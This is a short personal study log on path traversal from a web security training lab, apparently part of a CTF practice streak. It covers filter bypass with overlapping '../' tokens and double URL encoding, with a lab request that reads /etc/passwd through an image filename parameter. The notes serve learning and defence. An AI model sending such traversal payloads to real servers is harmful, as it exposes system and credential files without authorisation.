## Path Traversals
**Date completed**: 2025-05-08

No I missed two days on my CTF Streak :(. It's okay we continue forward! Starting the streak again. CTFs were getting exponentially more difficult, so I'm starting portswigger's academy lessons/labs on common web vulnerabilities using BurpSuite. This will help me with future CTFs, as well as enhance my overall cybersecurity knowledge.

### Goal

Understand the basic path traversal vulnerabilities.

### Key concepts


#### URL Encoding Quick Notes

Overlapping tokens such as `....//` survive a single-pass filter that strips only the first `../`.*
| What you send     | 1st URL-decode step | 2nd URL-decode step | Meaning                  |
| ----------------- | ------------------- | ------------------- | ------------------------ |
| `%2e%2e%2f`       | `../`               | (no change)         | `../` (*single-encoded*) |
| `%252e%252e%252f` | `%2e%2e%2f`         | `../`               | `../` (*double-encoded*) |


### Example to Remember

1. Browse to **Product image** endpoint and intercept the request  
   `GET /image?filename=45.jpg`
2. Replace the `filename` value with  
3. Forward the request and observe the server returning the contents of `/etc/passwd`.

```http
GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/2

🧠 What I Learned
  - More experience with BurpSuite
  - Path Traversal Vulnerabilities
  - URL Encoding to bypass basic filtering